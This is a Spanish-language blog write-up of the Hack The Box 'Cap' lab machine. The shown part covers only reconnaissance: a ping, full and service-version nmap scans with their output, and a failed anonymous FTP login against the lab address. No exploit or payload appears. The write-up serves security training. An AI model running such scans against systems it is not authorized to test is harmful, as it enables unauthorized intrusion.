<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box Cap - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina Cap en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box Cap">
<meta property="og:url" content="http://localhost:4000/htb-cap/">


  <meta property="og:description" content="Resolución de la máquina Cap en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-cap/cap.jpg">





  <meta property="article:published_time" content="2021-10-30T00:00:00-05:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-cap/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Artículos</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categorías</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Etiquetas</a>
            </li>
<li class="masthead__menu-item">
              <a href="/buscador/">Buscador</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">Contacto</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box Cap</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box Cap">
    <meta itemprop="description" content="Resolución de la máquina Cap en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="October 30, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Cap
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-10-30T00:00:00-05:00">October 30, 2021 </time> 
          
          
        </p>
        <p><img src="/assets/images/htb-cap/banner-cap.jpg" alt=""></p>

<h2 id="cap">Cap</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.245.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.245
PING 10.10.10.245 <span class="o">(</span>10.10.10.245<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.245: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>65.6 ms

<span class="nt">---</span> 10.10.10.245 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 65.616/65.616/65.616/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.245 <span class="nt">-oG</span> allPorts
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-22 19:29 CDT
Initiating Ping Scan at 19:29
Scanning 10.10.10.245 <span class="o">[</span>4 ports]
Completed Ping Scan at 19:29, 0.10s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 19:29
Scanning 10.10.10.245 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.10.245
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Completed SYN Stealth Scan at 19:29, 21.74s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.245
Host is up <span class="o">(</span>0.067s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>22.09 seconds
           Raw packets sent: 70068 <span class="o">(</span>3.083MB<span class="o">)</span> | Rcvd: 70048 <span class="o">(</span>2.802MB<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.245
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 21,22,80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
   8   │ 

</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,22,80 10.10.10.245 <span class="nt">-oN</span> target
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-22 19:31 CDT
Nmap scan report <span class="k">for </span>10.10.10.245                            
Host is up <span class="o">(</span>0.066s latency<span class="o">)</span><span class="nb">.</span>                                     
                                                                                                                                   PORT   STATE SERVICE VERSION                                                                                                       
21/tcp open  ftp     vsftpd 3.0.3                                                                                                  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>                                                  
| ssh-hostkey:                                                                                                                     
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 <span class="o">(</span>RSA<span class="o">)</span>                                                                     
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c <span class="o">(</span>ECDSA<span class="o">)</span>                                                                    
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 <span class="o">(</span>ED25519<span class="o">)</span>                                                                  
80/tcp open  http    gunicorn                                                                                                      
| fingerprint-strings:                                                                                                             
|   FourOhFourRequest:                                                                                                             
|     HTTP/1.0 404 NOT FOUND                                                                                                       
|     Server: gunicorn                                                                                                             
|     Date: Mon, 23 Aug 2021 00:31:15 GMT                                                                                          
|     Connection: close                                                                                                            
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8                                                                                       
|     Content-Length: 232                                                                                                          
|     &lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 3.2 Final//EN"</span><span class="o">&gt;</span>                                                                      
|     &lt;title&gt;404 Not Found&lt;/title&gt;                                                                                                 
|     &lt;h1&gt;Not Found&lt;/h1&gt;                                                                                                           
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/
p&gt;                                                                                                                                 
|   GetRequest:                                                                                                                    
|     HTTP/1.0 200 OK                                                                                                              
|     Server: gunicorn                                                                                                             
|     Date: Mon, 23 Aug 2021 00:31:09 GMT                                                                                          
|     Connection: close                                                                                                            
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8                                                                                       
|     Content-Length: 19386                                                                                                        
|     &lt;<span class="o">!</span>DOCTYPE html&gt;                                                                                                              
|     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">"no-js"</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>                                                                                               
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>                                                                                                                       
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>                                                                                                       
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"x-ua-compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"ie=edge"</span><span class="o">&gt;</span>                                                                        
|     &lt;title&gt;Security Dashboard&lt;/title&gt;                                                                                            
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1"</span><span class="o">&gt;</span>                                                         
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"shortcut icon"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"image/png"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/images/icon/favicon.ico"</span><span class="o">&gt;</span>                                           
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/bootstrap.min.css"</span><span class="o">&gt;</span>                                                                 
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/font-awesome.min.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/themify-icons.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/metisMenu.css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/owl.carousel.min.css"</span><span class="o">&gt;</span>                                                              
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/static/css/slicknav.min.css"</span><span class="o">&gt;</span> 
|     &lt;<span class="o">!</span><span class="nt">--</span> amchar                                                
|   HTTPOptions:                                                                                                                   
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Mon, 23 Aug 2021 00:31:10 GMT
|     Connection: close
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &lt;html&gt;
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;title&gt;Bad Request&lt;/title&gt; 
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;#x27<span class="p">;</span>Invalid HTTP Version: &amp;#x27<span class="p">;</span>RTSP/1.0&amp;#x27<span class="p">;</span>&amp;#x27<span class="p">;</span>
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-server-header: gunicorn
|_http-title: Security Dashboard 
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://
nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/22%Time<span class="o">=</span>6122EC4C%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetR
SF:equest,2FE5,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20
SF:Mon,</span><span class="se">\x</span><span class="s2">2023</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2000:31:09</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\</span><span class="s2">
SF:nContent-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20193
SF:86</span><span class="se">\r\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html&gt;</span><span class="se">\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20class=</span><span class="se">\"</span><span class="s2">no-js</span><span class="se">\"\x</span><span class="s2">20lang=</span><span class="se">\"</span><span class="s2">en</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\</span><span class="s2">
SF:n</span><span class="se">\n</span><span class="s2">&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\x</span><span class="s2">20charset=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
SF:0&lt;meta</span><span class="se">\x</span><span class="s2">20http-equiv=</span><span class="se">\"</span><span class="s2">x-ua-compatible</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">ie=edge</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
SF:x20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Security</span><span class="se">\x</span><span class="s2">20Dashboard&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;meta</span><span class="se">\</span><span class="s2">
SF:x20name=</span><span class="se">\"</span><span class="s2">viewport</span><span class="se">\"\x</span><span class="s2">20content=</span><span class="se">\"</span><span class="s2">width=device-width,</span><span class="se">\x</span><span class="s2">20initial-scale=
SF:1</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">shortcut</span><span class="se">\x</span><span class="s2">20icon</span><span class="se">\"\x</span><span class="s2">20type=</span><span class="se">\"</span><span class="s2">image
SF:/png</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/images/icon/favicon</span><span class="se">\.</span><span class="s2">ico</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;
SF:link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/bootstrap</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;
SF:</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/fon
SF:t-awesome</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20
SF:href=</span><span class="se">\"</span><span class="s2">/static/css/themify-icons</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=
SF:</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/metisMenu</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
SF:0&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/css/owl</span><span class="se">\.</span><span class="s2">carousel</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">
SF:css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;link</span><span class="se">\x</span><span class="s2">20rel=</span><span class="se">\"</span><span class="s2">stylesheet</span><span class="se">\"\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/static/c
SF:ss/slicknav</span><span class="se">\.</span><span class="s2">min</span><span class="se">\.</span><span class="s2">css</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;!--</span><span class="se">\x</span><span class="s2">20amchar"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOption
SF:s,B3,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2
SF:023</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2000:31:10</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">Conten
SF:t-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Allow:</span><span class="se">\x</span><span class="s2">20OPTIONS,</span><span class="se">\x</span><span class="s2">20HEAD,</span><span class="se">\x</span><span class="s2">
SF:20GET</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,121,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">2
SF:0400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text
SF:/html</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20196</span><span class="se">\r\n\r\n</span><span class="s2">&lt;html&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;Bad</span><span class="se">\x</span><span class="s2">20Request&lt;/title&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/head&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;body&gt;</span><span class="se">\</span><span class="s2">
SF:n</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;h1&gt;&lt;p&gt;Bad</span><span class="se">\x</span><span class="s2">20Request&lt;/p&gt;&lt;/h1&gt;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20Invali
SF:d</span><span class="se">\x</span><span class="s2">20HTTP</span><span class="se">\x</span><span class="s2">20Version</span><span class="se">\x</span><span class="s2">20&amp;#x27;Invalid</span><span class="se">\x</span><span class="s2">20HTTP</span><span class="se">\x</span><span class="s2">20Version:</span><span class="se">\x</span><span class="s2">20&amp;#x27;RTSP
SF:/1</span><span class="se">\.</span><span class="s2">0&amp;#x27;&amp;#x27;</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/body&gt;</span><span class="se">\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,189
SF:,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20NOT</span><span class="se">\x</span><span class="s2">20FOUND</span><span class="se">\r\n</span><span class="s2">Server:</span><span class="se">\x</span><span class="s2">20gunicorn</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20M
SF:on,</span><span class="se">\x</span><span class="s2">2023</span><span class="se">\x</span><span class="s2">20Aug</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2000:31:15</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">
SF:Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20232</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n\r\n</span><span class="s2">&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20HTML</span><span class="se">\x</span><span class="s2">20PUBLIC</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">-//W3C//DTD</span><span class="se">\x</span><span class="s2">20HTML</span><span class="se">\x</span><span class="s2">203</span><span class="se">\.</span><span class="s2">2</span><span class="se">\x</span><span class="s2">20
SF:Final//EN</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&lt;title&gt;404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found&lt;/title&gt;</span><span class="se">\n</span><span class="s2">&lt;h1&gt;Not</span><span class="se">\x</span><span class="s2">20Found&lt;/h1&gt;
SF:</span><span class="se">\n</span><span class="s2">&lt;p&gt;The</span><span class="se">\x</span><span class="s2">20requested</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20was</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20found</span><span class="se">\x</span><span class="s2">20on</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20ser
SF:ver</span><span class="se">\.\x</span><span class="s2">20If</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20entered</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20URL</span><span class="se">\x</span><span class="s2">20manually</span><span class="se">\x</span><span class="s2">20please</span><span class="se">\x</span><span class="s2">20ch
SF:eck</span><span class="se">\x</span><span class="s2">20your</span><span class="se">\x</span><span class="s2">20spelling</span><span class="se">\x</span><span class="s2">20and</span><span class="se">\x</span><span class="s2">20try</span><span class="se">\x</span><span class="s2">20again</span><span class="se">\.</span><span class="s2">&lt;/p&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>132.16 seconds

</code></pre></div></div>

<p>Se valida si el servicio FTP permite la autenticación del usuario <em>anonymous</em>; sin embargo, no se puede ingresar.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.245
Connected to 10.10.10.245.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.245:kamiyo<span class="o">)</span>: anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp&gt;
</code></pre></div></div>

